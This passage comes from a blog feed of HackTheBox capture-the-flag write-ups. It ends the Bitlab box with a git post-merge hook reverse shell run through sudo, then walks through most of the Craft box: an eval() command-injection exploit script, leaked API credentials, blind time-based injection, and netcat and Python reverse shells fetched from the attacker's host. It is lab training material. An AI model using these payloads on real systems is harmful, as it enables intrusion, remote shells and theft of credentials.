-l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on bitlab:</span><br><span class="line">    env_reset, exempt_group=sudo, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on bitlab:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git pull</span><br></pre></td></tr></table></figure><p>This is used to automatically deploy projects to the server. The sudo is probably used to pull file where even if the permissions does not match.</p><p>The Git documentation point an interesting fact about <code>git pull</code>:</p><blockquote><p>In its default mode, <code>git pull</code> is shorthand for <code>git fetch</code> followed by <code>git merge FETCH_HEAD</code>.</p><p><a href="https://git-scm.com/docs/git-pull">https://git-scm.com/docs/git-pull</a></p></blockquote><p>That mean we have a <code>git merge</code> run as root. We can probably leverage this with a hook to achieve remote code execution as <code>root</code>. As a reminder:</p><blockquote><p>Hooks are programs you can place in a hooks directory to trigger actions at certain points in git’s execution. </p><p><a href="https://git-scm.com/docs/githooks">https://git-scm.com/docs/githooks</a></p></blockquote><p>We are going to use a <a href="https://git-scm.com/docs/githooks#_post_merge"><code>post-merge</code></a> hook since it’s going to be executed whenever a <code>git pull</code> is executed.</p><p>Unfortunately neither <code>profile</code> nor <code>deployer</code> project can be directly written as <code>www-data</code>. That’s not really a problem since we can simply copy the project to the <code>/tmp/</code> folder for example and be able to work on it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cp -r /var/www/html/profile /tmp/.hg8</span><br><span class="line">www-data@bitlab:/$ <span class="built_in">cd</span> /tmp/.hg8/profile/.git/hooks</span><br><span class="line">www-data@bitlab:/$ touch post-merge</span><br><span class="line">www-data@bitlab:/$ chmod +x post-merge</span><br></pre></td></tr></table></figure><p>Let’s try to open a reverse shell as <code>root</code> using that hook. First let’s create our reverse shell file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/$ cat post-merge</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>Then we open our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>Next step is to make a <code>sudo /usr/bin/git pull</code> to have our hook and reverse shell executed:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull</span><br><span class="line">Already up to date.</span><br></pre></td></tr></table></figure><p>Ah yes, there is no change to the project, let’s quickly go back to the Gitlab interface and commit a dummy file to <code>profile</code> project, then let’s <code>git pull</code> again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">www-data@bitlab:/tmp/.hg8/profile$ sudo /usr/bin/git pull   </span><br><span class="line">remote: Enumerating objects: 1, <span class="keyword">done</span>.</span><br><span class="line">remote: Counting objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Compressing objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">remote: Total 1 (delta 1), reused 1 (delta 1)</span><br><span class="line">Unpacking objects: 100% (1/1), <span class="keyword">done</span>.</span><br><span class="line">From ssh://localhost:3022/root/profile</span><br><span class="line">   34c4513..86773b8  master     -&gt; origin/master</span><br><span class="line">Updating 34c4513..86773b8</span><br><span class="line">Fast-forward</span><br><span class="line"> hg8 | 1 +</span><br><span class="line"> 1 file changed, 1 addition(+)</span><br></pre></td></tr></table></figure><p>And we get a new connection on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.114:40048</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">$ cat root.txt</span><br><span class="line">8xxxxxxxxxxxxxxxxxxxxxxxxc</span><br></pre></td></tr></table></figure><hr><p>As always do not hesitate to contact me for any questions or feedback.</p><p>See you next time !</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> HackTheBox </category>
          
          <category> Medium Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> bitlab </tag>
            
            <tag> obfuscation </tag>
            
            <tag> webshell </tag>
            
            <tag> git </tag>
            
            <tag> gitlab </tag>
            
            <tag> git hook </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Craft</title>
      <link href="/posts/craft/"/>
      <url>/posts/craft/</url>
      
        <content type="html"><![CDATA[<img width="582" alt="craft-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154040-9cee3180-986b-11ea-9048-4be3630fbacc.png"><p>Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.</p><p><strong>Tl;Dr:</strong> The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to <code>gilfoyle</code> repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.<br>The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH <code>root</code> account. We connect through SSH using this password and get the flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the host file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC craft.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 01:26 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> craft.htb (10.10.10.110)</span><br><span class="line">Host is up (0.048s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)</span><br><span class="line">443/tcp open  ssl/http nginx 1.15.8</span><br><span class="line">|_http-server-header: nginx/1.15.8</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.15 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 443 and the ssh port 22 open.</p><p>Opening <code>http://craft.htb</code> display the following website :</p><p><img src="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png" alt="Craft Website"></p><p>The website is super simple but give us two valuable information:</p><ul><li>A <code>gogs</code> instance is running (<code>gogs</code> is a self-hosted Git service written in Go) at <code>https://gogs.craft.htb/</code></li><li>An API is running and its documentation available at <code>https://api.craft.htb/api/</code></li></ul><p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 gogs.craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.110 api.craft.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>Following this, <code>https://gogs.craft.htb</code> displays:</p><p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p><p>and <code>https://api.craft.htb</code> displays:</p><p><img src="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png" alt="Craft API website"></p><p>We have the source code and the documentation of the API. That will surely be our entry point.</p><p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p><blockquote><p>Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a “..” session-file forgery in the file session provider in file.go.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p></blockquote><blockquote><p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p></blockquote><p>An exploit is also available (<a href="https://github.com/TheZ3ro/gogsownz">GogsOwnz</a>) and allows to gain administrator rights and RCE on a Gogs/Gitea server.</p><p>Unfortunately the footer of <code>https://gogs.craft.htb</code> shows that the version used is not a vulnerable one :</p><blockquote><p>© 2018 Gogs Version: 0.11.86.0130</p></blockquote><p>This confirms that our entry point will probably be the api. Let’s investigate.</p><p>We have access to the source code it will greatly help our investigation. The API is written in Python using the Flask framework.</p><p>Let’s clone it to check the code more easily :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ GIT_SSL_NO_VERIFY=<span class="literal">true</span> git <span class="built_in">clone</span> https://gogs.craft.htb/Craft/craft-api.git</span><br></pre></td></tr></table></figure><h3 id="Remote-code-execution-on-API"><a href="#Remote-code-execution-on-API" class="headerlink" title="Remote code execution on API"></a>Remote code execution on API</h3><p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be exploited for command injection. It’s the easiest way to land a shell on a box.<br>If this search don’t give any results I will move on to SQL injection and so on.</p><p>The most common way command injection vulnerability get introduced in Python is by the use of <code>eval()</code> function which is used to run the Python code (passed as argument) within the program.</p><p>A quick <code>grep</code> will tell us if such function is used within the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ grep -ri <span class="string">&quot;eval&quot;</span> craft-api</span><br><span class="line">craft-api/craft_api/api/brew/endpoints/brew.py:        <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br></pre></td></tr></table></figure><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p><p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@auth.auth_required</span></span><br><span class="line"><span class="meta">@api.expect(<span class="params">beer_entry</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Creates a new brew entry.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># make sure the ABV value is sane.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;%s &gt; 1&#x27;</span> % request.json[<span class="string">&#x27;abv&#x27;</span>]):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ABV must be a decimal value less than 1.0&quot;</span>, <span class="number">400</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    create_brew(request.json)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">201</span></span><br></pre></td></tr></table></figure><p>Any Python code sent in the request <code>abv</code> parameter will get interpreted. </p><p>Unfortunately <code>@auth.auth_required</code> inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint.</p><p>After reading the documentation and the source code, it doesn’t seem there is any way to create a new account or use an already made token to authenticate to the API. We need to find another way to authenticate.</p><p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p><p>There is a few good tools like <a href="https://github.com/dxa4481/truffleHog">truffleHog</a> or <a href="https://github.com/awslabs/git-secrets">git-secrets</a> that allows to automatically retrieve secrets and credentials accidentally committed.</p><p>Since there is only 6 commits in history we can manually review them to make sure we don’t forget anything. </p><p>At commit <code>a2d28ed155</code> we find an interesting cleanup:</p><p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p><p>Let’s try to use those credentials to authenticate to the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;https://api.craft.htb/api/auth/login&quot;</span> -k --user dinesh:4aUh0A8PbVJxgd</span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;</span>&#125;</span><br><span class="line">[hg8@archbook ~]$ curl -H <span class="string">&quot;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&quot;</span>  <span class="string">&quot;https://api.craft.htb/api/auth/check&quot;</span> -k</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>We are authenticated! Note here that this API doesn’t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that’s why taking time to read the code and understanding the inner workings of the app is important.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># craft_api/api/auth/endpoints/auth.py</span></span><br><span class="line">token = request.headers[<span class="string">&#x27;X-Craft-Api-Token&#x27;</span>]</span><br></pre></td></tr></table></figure><p>We have now all the needed information to perform our command injection :)</p><p>Since we need to authenticate and perform multiple queries on the <code>/brew</code> endpoint it’s better to write a script instead of having to do a thousand of curl request.</p><p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/login&#x27;</span>,  auth=(<span class="string">&#x27;dinesh&#x27;</span>, <span class="string">&#x27;4aUh0A8PbVJxgd&#x27;</span>), verify=<span class="literal">False</span>)</span><br><span class="line">json_response = json.loads(response.text)</span><br><span class="line">token = json_response[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Craft-API-Token&#x27;</span>: token, <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">response = requests.get(<span class="string">&#x27;https://api.craft.htb/api/auth/check&#x27;</span>, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(response.text)  <span class="comment"># make sure token is valid</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    brew_dict = &#123;&#125;</span><br><span class="line">    brew_dict[<span class="string">&#x27;abv&#x27;</span>] = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125;&quot;).read()&#x27;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">    brew_dict[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    brew_dict[<span class="string">&#x27;brewer&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    brew_dict[<span class="string">&#x27;style&#x27;</span>] = <span class="string">&#x27;bullshit&#x27;</span></span><br><span class="line">    </span><br><span class="line">    json_data = json.dumps(brew_dict)</span><br><span class="line">    response = requests.post(<span class="string">&#x27;https://api.craft.htb/api/brew/&#x27;</span>, headers=headers, data=json_data, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an OS command from the python code.</p><p>I added an <code>input(&#39;&gt; &#39;)</code> so we simply have to type our command to run it on the API. Shell style.</p><p>Unfortunately we don’t have any output available, so how are we going to know that our command executed successfully ?</p><p>With time-based injection ;)</p><p>We are going to inject a <code>sleep 3</code> command at each run:</p><ul><li>If the API hang for 3 seconds, it means our command got executed successfully</li><li>If the API respond immediately, the injection failed.</li></ul><p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p><p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Execution time: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(response.elapsed.total_seconds()))</span><br></pre></td></tr></table></figure><p>Let’s it give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">test</span></span><br><span class="line">Execution time: 0.147798</span><br><span class="line">&gt; sleep 3</span><br><span class="line">Execution time: 3.158874</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Looks like it works fine ! Let’s tweak our script a bit to be more comfortable to use:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- brew_dict[&#x27;abv&#x27;] = &#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125;&quot;).read()&#x27;.format(cmd)</span></span><br><span class="line"><span class="addition">+ brew_dict[&#x27;abv&#x27;] = &#x27;__import__(&quot;os&quot;).popen(&quot;&#123;&#125; &amp;&amp; sleep 3&quot;).read()&#x27;.format(cmd)</span></span><br></pre></td></tr></table></figure><p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p><p>Here is an example to illustrate:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; curl --<span class="built_in">help</span></span><br><span class="line">Execution time: 0.162407</span><br><span class="line">&gt; wget --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.160078</span><br></pre></td></tr></table></figure><p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command ran fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn’t start meaning <code>curl</code> is not probably not installed.</p><p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p><p>Let’s try to open our classic reverse shell. Start with our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And launch our test script on the API:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; nc -e /bin/sh 10.10.10.85 8585</span><br><span class="line">Execution time: 0.218422</span><br><span class="line">&gt; nc --<span class="built_in">help</span></span><br><span class="line">Execution time: 3.412322</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That’s strange but let’s move on to a different type of reverse shell. Since we know for sure that Python is installed let’s use a Python reverse shell.</p><p>To make things easier let’s launch a small http server to host our python reverse shell file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.py</span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;10.10.10.85&quot;</span>,8585));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>And back to our original terminal let’s launch our injection:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python test.py</span><br><span class="line">&#123;<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Token is valid!&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&gt; wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py</span><br><span class="line">Execution time: 1.15602</span><br><span class="line">&gt; python /tmp/hg8.py</span><br></pre></td></tr></table></figure><p>And surely enough a connection open on our <code>netcat</code> listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.110:57154</span><br><span class="line">/opt/app <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure><p><em>Note: Now that we are on the box we can investigate on why our original <code>netcat</code> command wasn’t working. Turn out the <code>netcat</code> version shipped in this box in a Busybox version. The manual state:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/opt/app <span class="comment"># nc</span></span><br><span class="line">BusyBox v1.29.3 (2019-01-24 07:45:07 UTC) multi-call binary.</span><br><span class="line"></span><br><span class="line">Usage: nc [OPTIONS] HOST PORT  - connect</span><br><span class="line">nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen</span><br><span class="line"></span><br><span class="line">    -e PROG    Run PROG after connect (must be last)</span><br><span class="line">   [...]</span><br></pre></td></tr></table></figure><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p><h3 id="Pivot-from-docker-container-to-user"><a href="#Pivot-from-docker-container-to-user" class="headerlink" title="Pivot from docker container to user"></a>Pivot from docker container to user</h3><p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. We probably won’t go far from here.</p><p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/opt/app/craft_api <span class="comment"># cat settings.py</span></span><br><span class="line"><span class="comment"># Flask settings</span></span><br><span class="line">FLASK_SERVER_NAME = <span class="string">&#x27;api.craft.htb&#x27;</span></span><br><span class="line">FLASK_DEBUG = False  <span class="comment"># Do not use debug mode in production</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-Restplus settings</span></span><br><span class="line">RESTPLUS_SWAGGER_UI_DOC_EXPANSION = <span class="string">&#x27;list&#x27;</span></span><br><span class="line">RESTPLUS_VALIDATE = True</span><br><span class="line">RESTPLUS_MASK_SWAGGER = False</span><br><span class="line">RESTPLUS_ERROR_404_HELP = False</span><br><span class="line">CRAFT_API_SECRET = <span class="string">&#x27;hz66OCkDtv8G6D&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># database</span></span><br><span class="line">MYSQL_DATABASE_USER = <span class="string">&#x27;craft&#x27;</span></span><br><span class="line">MYSQL_DATABASE_PASSWORD = <span 